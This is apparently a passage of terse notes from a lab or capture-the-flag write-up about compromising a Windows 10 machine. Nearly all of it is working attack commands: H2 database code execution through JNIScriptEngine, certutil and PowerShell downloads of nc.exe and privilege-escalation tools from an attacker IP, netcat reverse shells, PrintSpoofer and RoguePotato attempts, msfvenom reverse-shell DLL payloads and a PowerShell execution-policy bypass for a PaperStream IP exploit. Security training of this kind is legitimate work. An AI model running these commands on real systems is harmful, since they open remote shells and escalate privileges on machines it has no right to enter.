### Bypass the weird box using `\\`
```
C:\Windows\System32>whoami.exe
whoami.exe
jacko\tony

C:\Windows\System32>whoami
whoami
jacko\tony

C:\Windows\System32>cd ..
cd ..

C:\Windows>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c dir c:\\").getInputStream()).useDelimiter("\\Z").next()');

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.49.97/nc.exe C:\\users\\tony\\desktop\\nc.exe").getInputStream()).useDelimiter("\\Z").next()');


CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd /c dir C:\\users\\tony\\desktop").getInputStream()).useDelimiter("\\Z").next()');

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\users\\tony\\desktop\\nc.exe -e cmd 192.168.49.97 9001").getInputStream()).useDelimiter("\\Z").next()');
```

### Use powershell.exe or fix PATH variable so that we can execute some common commands.
```
c:\Windows\System32>certutil -urlcache -f http://192.168.49.97/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -f http://192.168.49.97/PrintSpoofer64.exe PrintSpoofer64.exe
****  Online  ****


CertUtil: -URLCache command completed successfully.
```
But failed. Fix above with `set PATH=%SystemRoot%\system32;%SystemRoot%;`

```
c:\Windows\SysWOW64\WindowsPowerShell\v1.0>powershell.exe
powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> certutil -urlcache -f http://192.168.49.97/PrintSpoofer64.exe PrintSpoofer64.exe <- won't work properly

PS C:\users\tony> Invoke-WebRequest "http://192.168.49.97/PrintSpoofer64.exe" -OutFile PrintSpoofer64.exe
```

PS C:\users\tony> Get-ComputerInfo
Get-ComputerInfo


WindowsBuildLabEx                                       : 18362.1.amd64fre.19h1_release.190318-1202
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Enterprise
WindowsInstallationType                                 : Client
WindowsInstallDateFromRegistry                          : 1/1/1970 12:00:00 AM
WindowsProductId                                        : 
WindowsProductName                                      : Windows 10 Enterprise
WindowsRegisteredOrganization                           : 
WindowsRegisteredOwner                                  : tony
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 1909


### PrintSpoofer and RoguePotato are all failed
```
.\PrintSpoofer64.exe -c "C:\Users\Tony\Desktop\nc.exe 192.168.49.97 7890 -e cmd"

.\PrintSpoofer64.exe -c "type C:\Users\Administrator\Desktop\proof.txt"

.\PrintSpoofer64.exe -c "C:\Windows\System32\whoami.exe"Invoke-WebRequest "http://192.168.49.97/PrintSpoofer64.exe" -OutFile PrintSpoofer64.exe

Invoke-WebRequest "http://192.168.49.97/RoguePotato.exe" -OutFile RoguePotato.exe

.\RoguePotato.exe -r 192.168.49.97 -l 8888 -e c:\windows\system32\cmd.exe -a "/c C:\Users\Tony\Desktop\nc.exe -e cmd 192.168.49.97 7890" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

RoguePotato.exe -r 192.168.49.97 -e "C:\Users\Tony\Desktop\nc.exe -e cmd 192.168.49.97 7890" -l 9999 -c "{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}" -p splintercode

RoguePotato.exe -r 192.168.49.97 -e "C:\Users\Tony\Desktop\nc.exe -e cmd 192.168.49.97 7890" -l 9092 -c "{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}"

.\RoguePotato.exe -r 192.168.49.97 -e "C:\Users\Tony\Desktop\nc.exe -e cmd 192.168.49.97 7890" -l 9092 -c "{B91D5831-B1BD-4608-8198-D72E155020F7}" -p UsoSvc


Invoke-WebRequest "http://192.168.49.97/shell.exe" -OutFile shell.exe
```

### Root
##### Within C:\Program Files (x86), we find an interesting program: PaperStream IP. EDB or searchsploit it.
```
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.49.97 LPORT=8082 # Not working
msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.49.243 LPORT=8082 # Note the application is found under "Program Files (x86)", so can't use the `x64` as payload.

certutil -urlcache -f "http://192.168.49.97/shell.dll" shell.dll
certutil -urlcache -f "http://192.168.49.97/49382.ps1" 49382.ps1

c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe c:\users\tony\49382.ps1 
File C:\Users\tony\49382.ps1 cannot be loaded because running scripts is disabled on this system. For 
more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.

c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass c:\users\tony\49382.ps1 
c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass c:\users\tony\exploit.ps1 
```
Above should work but didn't. So, I reset the manchine and it worked.